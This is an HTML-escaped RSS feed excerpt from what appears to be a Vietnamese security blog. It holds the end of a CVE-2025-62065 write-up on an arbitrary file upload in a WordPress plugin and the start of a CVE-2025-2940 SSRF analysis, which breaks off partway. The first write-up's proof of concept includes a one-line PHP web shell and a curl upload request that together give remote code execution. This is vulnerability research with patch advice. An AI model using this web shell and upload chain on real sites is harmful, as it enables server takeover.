start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Xác định đường dẫn tạm và &lt;strong&gt;URL&lt;/strong&gt; công khai&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$upload_dir = wp_upload_dir();&#xA;$tmpFilePath = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rtm_temp_&amp;#39; . wp_unique_filename($upload_dir[&amp;#39;basedir&amp;#39;], $file[&amp;#39;name&amp;#39;]);&#xA;$tmpFileUrl  = $upload_dir[&amp;#39;baseurl&amp;#39;] . &amp;#39;/&amp;#39; . basename($tmpFilePath);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tạo tên file tạm hợp lệ trong thư mục &lt;strong&gt;uploads&lt;/strong&gt; và &lt;strong&gt;URL&lt;/strong&gt; truy cập đến file đó, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$tmpFilePath = &amp;#34;/var/www/html/wp-content/uploads/rtm_temp_filename.zip&amp;#34;&#xA;$tmpFileUrl = &amp;#34;http://localhost/wp-content/uploads/rtm_temp_filename.zip&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;move_uploaded_file($file[&#39;tmp_name&#39;], $tmpFilePath)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Di chuyển file upload từ tmp PHP vào nơi tạm định nghĩa.&lt;/p&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;template_extract($tmpFileUrl, $file[&#39;name&#39;], true)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;function template_extract($url, $id, $return = false)&#xA;{&#xA;    // Lấy thư mục upload của WordPress và tạo thư mục lưu template&#xA;    $upload_dir = wp_upload_dir();&#xA;    $custom_dir = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rometheme_template&amp;#39;;&#xA;    &#xA;    // Tạo file tạm để tải file từ URL về&#xA;    $tempFile = wp_tempnam($url);&#xA;&#xA;    // Tạo hash ID cho template&#xA;    $hashId = wp_hash($id);&#xA;    $targetDir = $custom_dir . &amp;#39;/&amp;#39; . $hashId;&#xA;&#xA;    // Tải file từ URL&#xA;    $response = wp_remote_get($url, [&amp;#39;timeout&amp;#39; =&amp;gt; 300]);&#xA;&#xA;    // Kiểm tra lỗi trong quá trình tải file&#xA;    if (is_wp_error($response)) {&#xA;        wp_send_json_error($response-&amp;gt;get_error_message());&#xA;    }&#xA;&#xA;    // Lưu nội dung của file ZIP vào file tạm&#xA;    $fileContent = wp_remote_retrieve_body($response);&#xA;    file_put_contents($tempFile, $fileContent);&#xA;&#xA;    // Mở file ZIP và giải nén vào thư mục mục tiêu&#xA;    $zip = new ZipArchive();&#xA;    if ($zip-&amp;gt;open($tempFile) === TRUE) {&#xA;        wp_mkdir_p($targetDir);  // Tạo thư mục nếu chưa có&#xA;        $zip-&amp;gt;extractTo($targetDir);  // Giải nén vào thư mục mục tiêu&#xA;        $zip-&amp;gt;close();&#xA;        unlink($tempFile);  // Xóa file tạm&#xA;&#xA;        // Cập nhật tùy chọn &amp;#39;rtm_template_installed&amp;#39; trong database&#xA;        $option = get_option(&amp;#39;rtm_template_installed&amp;#39;, []);&#xA;        if (!is_array($option)) {&#xA;            $option = [];&#xA;        }&#xA;        $option[$hashId] = [&amp;#39;template_id&amp;#39; =&amp;gt; $id];&#xA;        update_option(&amp;#39;rtm_template_installed&amp;#39;, $option);&#xA;&#xA;        // Trả về kết quả&#xA;        if ($return) {&#xA;            return true;&#xA;        } else {&#xA;            wp_send_json_success([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;success extract&amp;#39;, &amp;#39;template&amp;#39; =&amp;gt; $hashId]);&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Ở đây file không được giải nén thẳng nên không thể sử dụng kỹ thuật &lt;strong&gt;Zip Slip&lt;/strong&gt; để di chuyển file vào thư mục cao hơn.&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng file được lưu trong trong &lt;code&gt;{wp_upload_dir}/rometheme_template/{hashId}/&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Trả về JSON&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;rtm_handle_upload_template()&lt;/code&gt; được đăng ký làm callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_rtm_handle_upload_template&amp;#39;, [$this, &amp;#39;rtm_handle_upload_template&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Có nghĩa là: Khi người dùng gửi yêu cầu AJAX đến &lt;code&gt;wp-admin/admin-ajax.php&lt;/code&gt; với &lt;code&gt;action=rtm_handle_upload_template&lt;/code&gt;, hàm &lt;code&gt;rtm_handle_upload_template()&lt;/code&gt; sẽ được gọi để xử lý yêu cầu.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph LR;&#xA;A[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --&amp;gt; B[&amp;#34;rtm_handle_upload_template()&amp;#34;]&#xA;B --&amp;gt; C{is .zip extension}&#xA;C --&amp;gt;|True| D{&amp;#34;check_ajax_referer()&amp;#34;}&#xA;C --&amp;gt;|False| E[&amp;#34;wp_send_json_error()&amp;#34;]&#xA;D --&amp;gt;|True| F[&amp;#34;template_extract()&amp;#34;]&#xA;D --&amp;gt;|False| G[Return 401]&#xA;F --&amp;gt;|Extract To| H[&amp;#34;{wp_upload_dir}/rometheme_template/{hashId}/&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Đăng nhập bài tài khoản &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Tạo post và edit bằng &lt;strong&gt;Elementor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;rkit_libs.template_nonce&lt;/code&gt; để lấy nonce&lt;/li&gt;&#xA;&lt;li&gt;Tạo file để RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Nén file vừa tạo&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;zip rce.zip rce.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Gửi request upload file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34; \&#xA;  -b &amp;#34;your_cookie&amp;#34; \&#xA;  -F &amp;#34;action=rtm_handle_upload_template&amp;#34; \&#xA;  -F &amp;#34;nonce=your_nonce&amp;#34; \&#xA;  -F &amp;#34;file=@rce.zip;filename=rce.zip;type=application/zip&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Truy cập file vừa upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/result.png&#34; title=&#34;RCE với file upload&#34; data-thumbnail=&#34;/posts/2025-11-04-cve-2025-62065/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE với file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-04-cve-2025-62065/result.png&#39; alt=&#34;Result&#34; height=&#34;106&#34; width=&#34;1193&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE với file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Câu hỏi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Điều tôi muốn nhấn mạnh là, mặc dù tệp này có thể truy cập thẳng, nhưng việc truy cập trực tiếp vẫn bị hạn chế bởi &lt;code&gt;hashid&lt;/code&gt;, do WordPress mặc định không cho phép liệt kê nội dung thư mục.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng là chuỗi: &lt;strong&gt;Arbitrary File Upload + file tạm public + giải nén thiếu kiểm soát&lt;/strong&gt; → rủi ro RCE. Bản vá (1.6.6) khắc phục bằng kiểm tra quyền, lưu tạm không public, whitelist ext, chặn traversal và scan nội dung.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Cập nhật lên &lt;strong&gt;1.6.6&lt;/strong&gt; ngay.&lt;/li&gt;&#xA;&lt;li&gt;Nếu chưa cập nhật: vô hiệu hoá upload template hoặc giới hạn chỉ admin.&lt;/li&gt;&#xA;&lt;li&gt;Luôn lưu file upload ở nơi không public, whitelist ext, chặn path traversal và scan nội dung trước khi giải nén.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin &amp;lt;= 1.6.5  is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2940 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-03-cve-2025-2940/</link>
      <pubDate>Mon, 03 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-03-cve-2025-2940/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Ninja Tables – Easy Data Table Builder&lt;/strong&gt; cho WordPress tồn tại lỗ hổng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong tất cả các phiên bản cho đến và bao gồm &lt;strong&gt;5.0.18&lt;/strong&gt;, thông qua tham số &lt;code&gt;args[url]&lt;/code&gt;. Lỗ hổng này cho phép &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; thực hiện các &lt;strong&gt;web requests&lt;/strong&gt; đến các &lt;strong&gt;arbitrary locations&lt;/strong&gt; bắt nguồn từ &lt;strong&gt;web application&lt;/strong&gt;, và có thể được sử dụng để &lt;strong&gt;query&lt;/strong&gt; và &lt;strong&gt;modify&lt;/strong&gt; thông tin từ các &lt;strong&gt;internal services&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2940&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2940&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.0.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0.19&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-tables/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Ninja Tables&lt;/strong&gt;: &lt;strong&gt;5.0.18&lt;/strong&gt; (vulnerable) và &lt;strong&gt;5.0.19&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Theo mô tả của CVE, vị trí đáng chú ý trong patch là chỗ mã xử lý &lt;code&gt;args[url]&lt;/code&gt; — đây có thể là nguyên nhân chính dẫn đến lỗ hổng vì tham số này được sử dụng trực tiếp trong luồng thực hiện request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/diff.png&#34; title=&#34;Vị trí tiền đề gây ra lỗ hổng&#34; data-thumbnail=&#34;/posts/2025-11-03-cve-2025-2940/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch diff&lt;/h2&gt;&lt;p&gt;Vị trí tiền đề gây ra lỗ hổng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; 